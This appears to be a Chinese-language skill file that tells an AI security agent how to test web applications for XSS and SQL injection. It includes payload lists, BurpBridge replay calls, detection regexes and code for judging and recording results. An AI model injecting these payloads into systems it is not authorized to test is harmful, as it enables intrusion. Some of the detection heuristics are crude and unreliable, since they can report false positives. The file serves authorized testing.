---
name: injection-testing
description: "注入测试方法论，Security Agent使用。XSS/SQLI测试、Payload注入、结果判定。"
---

# Injection Testing Skill

> 注入测试方法论 — XSS测试、SQLI测试、Payload注入、结果判定

---

## 注入类型

| 类型 | 测试方法 | 检测方式 |
|------|---------|---------|
| **XSS** | 输入payload，检查响应是否包含payload | 响应体包含未转义的payload |
| **SQLI** | 输入payload，检查响应是否有SQL错误 | 错误信息、异常响应 |
| **命令注入** | 输入payload，检查是否执行命令 | 响应时间、命令输出 |
| **模板注入** | 输入payload，检查是否渲染模板 | 响应包含模板执行结果 |

---

## XSS测试

### Payload列表

```javascript
const xssPayloads = [
  // 基础测试
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  "<svg onload=alert(1)>",
  "'\"><script>alert(1)</script>",
  
  // 属性注入
  "\"onfocus=alert(1) autofocus",
  "'onmouseover=alert(1)'",
  
  // 事件处理
  "javascript:alert(1)",
  "onerror=alert(1)",
  
  // 编码绕过
  "<script>alert&#40;1&#41;</script>",
  "<img src=x onerror=\"alert(1)\">"
];
```

### 测试流程

```
1. 定位输入点
   - 文本输入框
   - URL参数
   - API请求体字段
   
2. 注入payload
   browser-type(selector, payload)
   browser-click(submit)
   
3. 检查响应
   browser_snapshot → 查找alert(1)或payload
   
4. 判定漏洞
   - 响应包含未转义的payload → XSS漏洞
   - payload被转义 → 安全
```

### 通过BurpBridge测试

```javascript
// 从表单提交的请求中检查XSS
// 1. Form Agent提交payload
// 2. BurpBridge捕获请求
// 3. Security Agent查询请求详情
// 4. 检查响应是否包含payload

const history = await mcp__burpbridge__get_http_request_detail(input: {
  history_id: "entry_xss_test"
});

// 检查响应体
if (history.responseSummary.includes("<script>alert(1)</script>")) {
  // 发现XSS漏洞
  reportVulnerability({
    type: "XSS",
    severity: "Medium",
    endpoint: history.url,
    payload: "<script>alert(1)</script>",
    evidence: history.responseSummary
  });
}
```

---

## SQL注入测试

### Payload列表

```javascript
const sqliPayloads = [
  // 基础测试
  "' OR '1'='1",
  "\" OR \"1\"=\"1",
  "' OR 1=1--",
  "1' OR '1'='1'--",
  
  // UNION注入
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "' UNION SELECT 1,2,3--",
  
  // 报错注入
  "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
  
  // 时间盲注
  "' AND SLEEP(5)--",
  "' AND BENCHMARK(10000000,SHA1('test'))--"
];
```

### 检测方式

```javascript
// 1. 检查SQL错误信息
const sqlErrorPatterns = [
  /SQL syntax.*MySQL/,
  /Warning.*mysql_/,
  /PostgreSQL.*ERROR/,
  /ORA-\d{5}/,          // Oracle错误
  /Microsoft SQL Server/,
  /sqlite3\.OperationalError/
];

function detectSqlError(response) {
  for (const pattern of sqlErrorPatterns) {
    if (pattern.test(response)) {
      return { detected: true, type: "error_based" };
    }
  }
  return { detected: false };
}

// 2. 检查时间延迟
function detectTimeDelay(originalTime, responseTime, threshold = 5) {
  if (responseTime - originalTime >= threshold * 1000) {
    return { detected: true, type: "time_based" };
  }
  return { detected: false };
}
```

---

## 测试执行方式

### 方式1：通过browser-use填写表单

```yaml
/browser-use描述任务:
"请在搜索框中输入测试payload '<script>alert(1)</script>'
然后点击搜索按钮
等待响应完成"
```

### 方式2：通过API直接测试

```javascript
// 使用BurpBridge重放，修改请求体
await mcp__burpbridge__replay_http_request_as_role(input: {
  history_entry_id: "entry_api_search",
  target_role: "user",
  modifications: {
    json_field_overrides: {
      "query": "' OR '1'='1"
    }
  }
});
```

---

## 结果判定与记录

### XSS判定

```javascript
function analyzeXssResult(originalResponse, testResponse, payload) {
  // 检查payload是否出现在响应中
  if (testResponse.includes(payload)) {
    // payload未被转义 → XSS漏洞
    return {
      vulnerable: true,
      type: "XSS",
      severity: payload.includes("<script>") ? "High" : "Medium",
      evidence: `响应包含未转义的payload: ${payload}`
    };
  }
  
  // 检查部分payload
  if (testResponse.includes("alert(1)")) {
    return {
      vulnerable: true,
      type: "XSS",
      severity: "Medium",
      evidence: `响应包含alert(1)`
    };
  }
  
  return {
    vulnerable: false,
    reason: "payload被转义或过滤"
  };
}
```

### SQLI判定

```javascript
function analyzeSqliResult(originalResponse, testResponse, responseTime) {
  // 检查SQL错误
  if (detectSqlError(testResponse).detected) {
    return {
      vulnerable: true,
      type: "SQLI",
      severity: "High",
      evidence: `响应包含SQL错误信息`
    };
  }
  
  // 检查数据异常
  if (testResponse.includes("NULL") || 
      testResponse.includes("information_schema") ||
      testResponse.length > originalResponse.length * 2) {
    return {
      vulnerable: true,
      type: "SQLI",
      severity: "High",
      evidence: `响应数据异常，可能存在UNION注入`
    };
  }
  
  // 检查时间延迟
  if (responseTime > 5000) {
    return {
      vulnerable: true,
      type: "SQLI",
      severity: "Medium",
      evidence: `响应延迟${responseTime/1000}秒，可能存在时间盲注`
    };
  }
  
  return {
    vulnerable: false,
    reason: "无SQL注入迹象"
  };
}
```

---

## 写入findings

```javascript
async function saveInjectionVulnerability(vulnData) {
  await mongodb-mcp-server_insert-many({
    database: "webtest",
    collection: "findings",
    documents: [{
      session_id: currentSessionId,
      vuln_id: `${vulnData.type}_${timestamp()}`,
      type: vulnData.type,
      severity: vulnData.severity,
      endpoint: vulnData.endpoint,
      method: vulnData.method,
      tested_role: vulnData.role,
      result: {
        payload: vulnData.payload,
        evidence: vulnData.evidence
      },
      discovered_at: Date.now()
    }]
  });
}
```

---

## 加载要求

```yaml
## Skill 加载规则（双通道）

# Security 必须加载

1. 尝试: skill({ name: "injection-testing" })
2. 若失败: Read("skills/security/injection-testing/SKILL.md")
3. 此Skill必须加载完成才能继续执行
```